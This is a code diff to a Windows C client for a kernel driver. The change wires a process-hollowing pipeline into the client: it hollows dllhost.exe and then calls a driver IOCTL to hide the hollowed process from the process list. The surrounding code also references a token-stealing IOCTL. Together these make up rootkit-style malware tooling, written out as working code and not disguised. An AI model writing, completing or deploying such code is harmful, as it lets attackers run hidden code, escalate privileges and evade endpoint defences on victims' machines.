@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include "IoctlCommon.h"
+#include "../../processhollowing/hollow.h"
 
 const char* k = "[+]";
 const char* e = "[-]";
@@ -103,15 +104,32 @@ int main() {
     else
         printf("%s STEAL_TOKEN failed: %lu\n", e, GetLastError());
 
-    // --- IOCTL 5: Run hollow pipeline then hide the process ---
-    // (call your hollow.cpp pipeline here, get the PID)
-    // DWORD hollowedPid = RunHollowPipeline();
+    // --- IOCTL 5: Hollow dllhost.exe then hide it ---
+    printf("%s Running hollow pipeline...\n", i);
 
-    // Then hide it:
-    // JOCKY_PID_INPUT hideInput = { hollowedPid };
-    // DeviceIoControl(hDevice, IOCTL_JOCKY_HIDE_PROCESS,
-    //     &hideInput, sizeof(hideInput),
-    //     NULL, 0, &bytesReturned, NULL);
+    DWORD hollowedPid = RunHollowPipeline();
+    if (hollowedPid != 0) {
+        printf("%s Hollowed PID: %lu — hiding from process list...\n", k, hollowedPid);
+
+        JOCKY_PID_INPUT hideInput = { hollowedPid };
+        bytesReturned = 0;
+
+        result = DeviceIoControl(
+            hDevice,
+            IOCTL_JOCKY_HIDE_PROCESS,
+            &hideInput, sizeof(hideInput),
+            NULL, 0,
+            &bytesReturned,
+            NULL
+        );
+
+        if (result)
+            printf("%s IOCTL_JOCKY_HIDE_PROCESS: PID %lu hidden\n", k, hollowedPid);
+        else
+            printf("%s HIDE_PROCESS failed: %lu\n", e, GetLastError());
+    } else {
+        printf("%s Hollow pipeline failed — skipping hide\n", e);
+    }
 
     CloseHandle(hDevice);
     return 0;
